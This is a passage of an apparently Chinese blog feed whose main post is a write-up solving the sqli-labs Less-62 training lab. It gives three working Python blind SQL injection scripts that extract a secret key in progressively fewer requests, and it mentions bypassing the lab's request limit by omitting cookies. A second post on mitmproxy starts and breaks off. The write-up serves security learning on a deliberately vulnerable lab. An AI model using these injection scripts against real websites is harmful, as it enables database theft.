    <title>sqli-labs靶场Less-62题解（少于130次）</title>
    <link href="/2020/12/04/sqli-labs-less-62/"/>
    <url>/2020/12/04/sqli-labs-less-62/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>靶场Less-62题目，是通过布尔注入获取一段secret key，该key存于<code>challenges</code>数据库的某个随机表名的表内。要求在请求次数不超过130次的情况下获取该key。</p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>直接用docker搭建：<code>sudo docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs:latest</code></p><h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>该注入点是<code>id</code>参数，SQL语句上下文是<code>SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code>，注入时用<code>&#39;)</code>闭合。一般思路是先获取存key的表的表名，再获取key所在的列的列名，再获取key。表名有10个字符，由大写字母和数字构成；列名为<code>secret_4个字符</code>，这4个字符由大写字母和数字构成；secret key为24个字符，由大小写字母和数字构成。</p><p>下面的脚本采用二分法比较ASCII码来获取数据，请求次数在210次左右。而题目要求是130次内，不过请求不带Cookie可绕过了这个限制。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">表名：10个字符。有大写字母和数字构成</span><br><span class="hljs-string">列名：secret_接4个字符，这4个字符由大写字母和数字构成</span><br><span class="hljs-string">secret：24个字符，由大小写字母和数字构成</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>un_chars = string.digits + string.ascii_uppercase  <span class="hljs-comment"># 按ASCII码从小到大排序</span><br>uln_chars = string.digits + string.ascii_uppercase + string.ascii_lowercase  <span class="hljs-comment"># 按ASCII码从小到大排序</span><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">tmpl_payload, length, chars</span>):<br>    <span class="hljs-keyword">global</span> try_count<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        left, right = <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(chars) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> left &lt; right:<br>            m = (left + right) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 左中位数</span><br>            payload = tmpl_payload % (i, <span class="hljs-built_in">ord</span>(chars[m]))<br>            resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>            try_count += <span class="hljs-number">1</span>  <span class="hljs-comment"># 统计请求个数</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>                left = m + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right = m<br>        result += chars[left]<br><br>    <span class="hljs-keyword">return</span> result<br><br><br>table_name = extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27;),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">10</span>, un_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>column_name = <span class="hljs-string">&quot;secret_&quot;</span> + extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr(substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot;</span> + table_name + <span class="hljs-string">&quot;&#x27; limit 2,1),8,4),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">4</span>, un_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column_name:&quot;</span>, column_name)<br><br>secret_key = extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr((select &quot;</span> + column_name + <span class="hljs-string">&quot; from &quot;</span> + table_name+<span class="hljs-string">&quot;),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">24</span>, uln_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br></code></pre></div></td></tr></table></figure><h2 id="利用多状态"><a href="#利用多状态" class="headerlink" title="利用多状态"></a>利用多状态</h2><p>虽说上面可以绕过尝试次数限制，那如果就要尝试次数在130次内呢。</p><p>上面的二分法通过判断响应里是否有查询结果来判断注入的SQL语句为True或False，响应里有两种状态：有查询结果和无查询结果。其实响应里存在多个状态，id为1时返回的<code>Login name</code>为<code>Angelina</code>，为<code>2</code>时返回的是<code>Dummy</code>，还有为3，为4，为5等。假如我们要判断数据库里一个字符中的N个比特是什么，我们需要2的N次方个状态，如：我们要判断某串字符串第<code>i</code>个字符的第<code>j</code>位开始的三个比特是否为：000，001，010，011，100，101，110或111，写成SQL语句就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (2**j + 2**(j+1) + 2**(j+2))<br>    WHEN 0 THEN 1<br>    WHEN 2**j THEN 2<br>    WHEN 2**(j+1) THEN 3<br>    WHEN 2**(j+1) + 2**j THEN 4<br>    WHEN 2**(j+2) THEN 5<br>    WHEN 2**(j+2) + 2**j THEN 6<br>    WHEN 2**(j+2) + 2**(j+1) THEN 7<br>    ELSE 8<br>END<br></code></pre></div></td></tr></table></figure><p>因为users表里的数据有13条，也就是13个状态，大于8，小于16，所以每次请求通过比较8个状态获取3个比特的数据。</p><blockquote><p>一个小问题：为什么id为1时，返回的name是<code>Angelina</code>？而数据库里id为1的name是<code>Dumb</code>？</p><p>因为响应中返回的name是从硬编码在PHP代码里的数组里通过下标获取的，看代码：<a href="https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L104">https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L104</a></p></blockquote><p>通过上面的思路，编写脚本如下。请求次数减少到114次。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_bits</span>(<span class="hljs-params">query, i, j</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query执行结果的第 i 个（从1开始算）字符的第 j 位开始的 3 个比特</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> try_count<br><br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#x27;+(</span><br><span class="hljs-string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span><br><span class="hljs-string">    WHEN &#123;0&#125; THEN 1</span><br><span class="hljs-string">    WHEN &#123;1&#125; THEN 2</span><br><span class="hljs-string">    WHEN &#123;2&#125; THEN 3</span><br><span class="hljs-string">    WHEN &#123;3&#125; THEN 4</span><br><span class="hljs-string">    WHEN &#123;4&#125; THEN 5</span><br><span class="hljs-string">    WHEN &#123;5&#125; THEN 6</span><br><span class="hljs-string">    WHEN &#123;6&#125; THEN 7</span><br><span class="hljs-string">    ELSE 8</span><br><span class="hljs-string">END</span><br><span class="hljs-string">)+&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>), <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>) + <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>), <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>) + <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>) + <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>), query=query, bit_mark=<span class="hljs-number">2</span>**j + <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>) + <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>), i=i)<br>    payload = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, payload.strip().replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>    <span class="hljs-comment"># print(payload)</span><br><br>    resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>    try_count += <span class="hljs-number">1</span><br><br>    info = &#123;<br>        <span class="hljs-string">&quot;Angelina&quot;</span>: <span class="hljs-string">&quot;000&quot;</span>,<br>        <span class="hljs-string">&quot;Dummy&quot;</span>: <span class="hljs-string">&quot;001&quot;</span>,<br>        <span class="hljs-string">&quot;secure&quot;</span>: <span class="hljs-string">&quot;010&quot;</span>,<br>        <span class="hljs-string">&quot;stupid&quot;</span>: <span class="hljs-string">&quot;011&quot;</span>,<br>        <span class="hljs-string">&quot;superman&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>,<br>        <span class="hljs-string">&quot;batman&quot;</span>: <span class="hljs-string">&quot;101&quot;</span>,<br>        <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;110&quot;</span>,<br>        <span class="hljs-string">&quot;admin1&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;Your Login name : (.*?)&lt;br&gt;&quot;</span>, resp.text)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span><br>    bits = info.get(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">assert</span> bits<br>    <span class="hljs-keyword">return</span> bits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">query, length</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        b3 = extract_bits(query, i, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 00000111</span><br>        b2 = extract_bits(query, i, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 00111000</span><br>        b1 = extract_bits(query, i, <span class="hljs-number">5</span>)  <span class="hljs-comment"># 11100000</span><br>        bit = b1[:<span class="hljs-number">2</span>] + b2 + b3<br>        res += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bit, <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    column_name = <span class="hljs-string">&quot;secret_&quot;</span> + extract_data(<br>        <span class="hljs-string">&quot;substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot;</span> + table_name + <span class="hljs-string">&quot;&#x27; limit 2,1),8,4)&quot;</span>,<br>        <span class="hljs-number">4</span><br>    )<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column_name:&quot;</span>, column_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select &quot;</span> + column_name + <span class="hljs-string">&quot; from challenges.&quot;</span> + table_name, <span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br></code></pre></div></td></tr></table></figure><h2 id="再减少点次数"><a href="#再减少点次数" class="headerlink" title="再减少点次数"></a>再减少点次数</h2><p>上面通过获取表名，再列名，再key。其实也可以不获取列名，只要知道表里有多少列，key所在的列在第几列即可，少点尝试次数。将上面main块的代码改成：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x&quot;</span> % table_name, <span class="hljs-number">24</span>)   <span class="hljs-comment"># 主要改的是这一句</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br></code></pre></div></td></tr></table></figure><p>请求次数是102次。</p><h2 id="再减少些次数"><a href="#再减少些次数" class="headerlink" title="再减少些次数"></a>再减少些次数</h2><p>一般MySQL的表名是区分大小写的，而在字符串比较的时候是不区分大小写的。进到docker容器里（<code>sudo docker exec -it sqli-lab mysql</code>）执行下面SQL语句测试下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">use security<br><br>SELECT * FROM users;  # 返回了数据<br>SELECT * FROM userS;  # 报错，表名不存在<br>SELECT * FROM users WHERE username=&#x27;admin&#x27;;  # 返回admin<br>SELECT * FROM users WHERE username=&#x27;ADMIn&#x27;;  # 还是可以返回admin<br></code></pre></div></td></tr></table></figure><p>再看sqli-labs比较key是否正确的SQL语句（代码<a href="https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L152">在这</a>）：</p><figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> FROM $table <span class="hljs-keyword">WHERE</span> $col1= <span class="hljs-string">&#x27;$key&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p>所以在获取key时，可以不管字母的大小写。而对于表名，它的构成是大写字母和数字，也用不着理会它的大小写。</p><p>再看数字、大写字母、小写字母的ASCII码的二进制格式：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">数字： 0011xxxx<br>大写： 010xxxxx<br>小写： 011xxxxx<br></code></pre></div></td></tr></table></figure><p>在获取表名或key时，我们判断第7位（比特）是不是1就知道该字符是数字或字母；而第6位不用管，因为对于数字，该位为1，对于字母，我们不用管字母的大小写也就不用管该位是0还是1。所以对于每个字符，我们只需获取第7位和前5位即可。</p><p>编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_bits</span>(<span class="hljs-params">query, i, bit_values: <span class="hljs-built_in">list</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query执行结果的第 i 个（从1开始算）字符的3个比特</span><br><span class="hljs-string">    哪3个比特由bit_values指定</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> try_count<br><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(bit_values) == <span class="hljs-number">8</span><br>    bit_marks = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> bit_values:<br>        bit_marks |= v<br><br><br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#x27;+(</span><br><span class="hljs-string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span><br><span class="hljs-string">    WHEN &#123;0&#125; THEN 1</span><br><span class="hljs-string">    WHEN &#123;1&#125; THEN 2</span><br><span class="hljs-string">    WHEN &#123;2&#125; THEN 3</span><br><span class="hljs-string">    WHEN &#123;3&#125; THEN 4</span><br><span class="hljs-string">    WHEN &#123;4&#125; THEN 5</span><br><span class="hljs-string">    WHEN &#123;5&#125; THEN 6</span><br><span class="hljs-string">    WHEN &#123;6&#125; THEN 7</span><br><span class="hljs-string">    ELSE 8</span><br><span class="hljs-string">END</span><br><span class="hljs-string">)+&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(*bit_values[:<span class="hljs-number">7</span>], query=query, bit_mark=bit_marks, i=i)<br>    payload = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, payload.strip().replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>    <span class="hljs-comment"># print(payload)</span><br><br>    resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>    try_count += <span class="hljs-number">1</span><br><br>    infos = [<span class="hljs-string">&quot;Angelina&quot;</span>, <span class="hljs-string">&quot;Dummy&quot;</span>, <span class="hljs-string">&quot;secure&quot;</span>, <span class="hljs-string">&quot;stupid&quot;</span>, <span class="hljs-string">&quot;superman&quot;</span>, <span class="hljs-string">&quot;batman&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;admin1&quot;</span>]<br><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;Your Login name : (.*?)&lt;br&gt;&quot;</span>, resp.text)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) <span class="hljs-keyword">in</span> infos<br>    bits = bit_values[infos.index(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))]<br>    <span class="hljs-keyword">return</span> bits<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">query, length</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query查询结果的length个字符，每个字符只获取其第7位和前5位</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        b2 = extract_bits(query, i, [<span class="hljs-number">0b00000000</span>, <span class="hljs-number">0b00000001</span>, <span class="hljs-number">0b00000010</span>, <span class="hljs-number">0b00000011</span>, <span class="hljs-number">0b00000100</span>, <span class="hljs-number">0b00000101</span>, <span class="hljs-number">0b00000110</span>, <span class="hljs-number">0b00000111</span>])  <span class="hljs-comment"># 00000111</span><br>        b1 = extract_bits(query, i, [<span class="hljs-number">0b00000000</span>, <span class="hljs-number">0b00001000</span>, <span class="hljs-number">0b00010000</span>, <span class="hljs-number">0b00011000</span>, <span class="hljs-number">0b01000000</span>, <span class="hljs-number">0b01001000</span>, <span class="hljs-number">0b01010000</span>, <span class="hljs-number">0b01011000</span>])  <span class="hljs-comment"># 01011000</span><br>        <span class="hljs-keyword">if</span> b1 &amp; <span class="hljs-number">0b01000000</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># 该字符为数字</span><br>            bit = b1 | b2 | <span class="hljs-number">0b00100000</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 该字符为字母</span><br>            bit = b1 | b2<br>        res += <span class="hljs-built_in">chr</span>(bit)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x&quot;</span> % table_name, <span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br><br></code></pre></div></td></tr></table></figure><p>请求次数是68次。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于mitmproxy实现web被动扫描代理</title>
    <link href="/2020/08/30/web-passive-scanner-based-on-mitmproxy/"/>
    <url>/2020/08/30/web-passive-scanner-based-on-mitmproxy/</url>
    
    <content type="html"><![CDATA[<p>mitmproxy模块提供的使用方式是使用命令行来开一个代理，这里用python代码调用mitmproxy的方法，开一个代理，获取请求信息，并添加到队列中，供后续扫描使用。</p><p>本文使用的环境：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Python</span> <span class="hljs-number">3</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">mitmproxy</span> <span class="hljs-number">5</span>.<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装：<code>pip install mitmproxy</code>。依赖多，国内安装慢，建议用国内镜像来安装：<code>pip install -i https://mirrors.aliyun.com/pypi/simple/ mitmproxy</code></p><h4 id="启动代理"><a href="#启动代理" class="headerlink" title="启动代理"></a>启动代理</h4><p>可以直接用：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> 